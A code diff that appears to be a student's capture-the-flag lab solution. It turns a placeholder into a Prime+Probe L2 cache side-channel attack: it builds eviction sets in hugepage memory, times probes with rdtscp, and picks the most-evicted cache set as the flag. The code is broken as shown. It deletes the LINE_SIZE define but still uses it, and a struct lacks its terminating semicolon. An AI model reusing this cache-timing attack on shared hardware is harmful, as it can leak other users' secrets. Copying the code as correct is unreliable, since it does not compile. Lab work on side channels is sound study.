@@ -8,13 +8,23 @@
 #include <time.h>
 
 
-#define L2_ASSOCIATIVITY 8
+#define L2_ASSOCIATIVITY 16
 #define L2_SETS 1024 
-#define LINE_SIZE 64
+#define BASE_SET 64
 #define PAGE_SIZE (1 << 21) // 2 MB
 #ifndef SET_STRIDE_BYTES 
 #define SET_STRIDE_BYTES (1 << 16) 
 #endif
+
+// Linked List so that the CPU will have to follow the chain of pointers, which will cause cache evictions
+struct linked_list_node {
+    struct linked_list_node *next;
+    char padding[LINE_SIZE - sizeof(struct linked_list_node *)];
+}
+
+// Variables for the work area and the linked list chains for each cache set
+void *work_area;
+struct linked_list_node *set_chains[L2_SETS];
 
 // Calculate Latency Difference through rdtscp
 static inline uint64_t rdtscp(void) {
@@ -23,22 +33,108 @@ static inline uint64_t rdtscp(void) {
     return ((uint64_t)hi << 32) | lo; // output is the time stamp counter
 }
 
-// Linked List so that the CPU will have to follow the chain of pointers, which will cause cache evictions
-struct linked_list_node {
-    struct linked_list_node *next;
-    char padding[LINE_SIZE - sizeof(struct linked_list_node *)];
+// Shuffle the pointers in the linked list to break predictable memory access patterns to ensure the prime + probe measurements are accurate
+void shuffle_pointers(struct linked_list_node **nodes, int count) {
+    for (int i = count - 1; i > 0; i--) {
+        int j = rand() % (i + 1);
+        struct linked_list_node *temp = nodes[i];
+        nodes[i] = nodes[j];
+        nodes[j] = temp;
+    }
 }
 
-void *work_area;
-struct linked_list_node *set_chains[L2_SETS];
+// Construct eviction sets for a given set ID 
+void eviction_set_construction(int logical_set_id) {
+    char *base = (char *)work_area;
+    struct linked_list_node *nodes[L2_ASSOCIATIVITY];
+    for (int way = 0; way < L2_ASSOCIATIVITY; way++) {
+        nodes[way] = (struct linked_list_node *)((base + (logical_set_id * BASE_SET)) + (way * SET_STRIDE_BYTES));
+    }
+    shuffle_pointers(nodes, L2_ASSOCIATIVITY);
+    for (int way = 0; way < L2_ASSOCIATIVITY - 1; way++) {
+        nodes[way]->next = nodes[way + 1];
+    }
+    nodes[L2_ASSOCIATIVITY - 1]->next = NULL;
+    set_chains[logical_set_id] = nodes[0];
+}
 
+// Prime the cache by following the linked list for the given set ID
+void prime_cache(int set_id) {
+    struct linked_list_node *current = set_chains[set_id];
+    while (current) {
+        current = current->next;
+    }
+}
 
+// Probe the cache by measuring the time taken to follow the linked list for the given set ID
+uint64_t probe_cache(int set_id) {
+    uint64_t start_time = rdtscp();
+    struct linked_list_node *current = set_chains[set_id];
+    while (current) {
+        current = current->next;
+    }
+    return rdtscp() - start_time; // return the latency of probing the cache
+}
+
+// 
 
 int main(int argc, char const *argv[]) {
-    int flag = -1;
+    srand(time(NULL));
 
-    // Put your capture-the-flag code here
+    // Allocate a large memory region for the work area using hugepages
+    work_area = mmap(NULL,
+                     PAGE_SIZE,
+                     PROT_READ | PROT_WRITE,
+                     MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
+                     -1,
+                     0);
+    if(work_area == (void*) - 1) {
+        perror("mmap failed");
+        exit(EXIT_FAILURE);
+    }
+
+    memset(work_area, 0, PAGE_SIZE); // Initialize the work area with zeros
+
+    // Eviction set constructed for L2 cache sets
+    for(int i = 0; i < L2_SETS; i++) {
+        eviction_set_construction(i);
+    }
+
     
-    printf("Flag: %d\n", flag);
+    uint64_t threshold = 295; // From Part 01 Timing Graph 
+    int rounds = 15000; // High statistical rate to go above noise of measurements
+
+    // To record the hits above threshold
+    uint64_t record[L2_SETS];
+    memset(record, 0, sizeof(record));
+
+    for(int s = 0; s < L2_SETS; s++) {
+        uint64_t hits = 0;
+        for(int r = 0; r < rounds; r++) {
+            prime_cache(s);
+            // Waiting for Victim to access the cache line
+            for(volatile int wait = 0; wait < 200; wait++);
+            uint64_t latency = probe_cache(s);
+            if(latency > threshold) {
+                hits++;
+            }
+        }
+        record[s] = hits;
+        // Print sets with noticeable activity
+        if(hits > rounds * 0.1) {
+            printf("Set %d: %lu hits\n", s, hits);
+        }
+    }
+
+    // Find the set with the maximum number of hits
+    int flag = -1;
+    uint64_t max_hits = 0;
+    for(int i = 0; i < L2_SETS; i++) {
+        if(record[i] > max_hits) {
+            max_hits = record[i];
+            flag = i;
+        }
+    }
+    printf("\nDetected Flag Set: %d (Score: %lu)\n", flag, max_hits);
     return 0;
 }
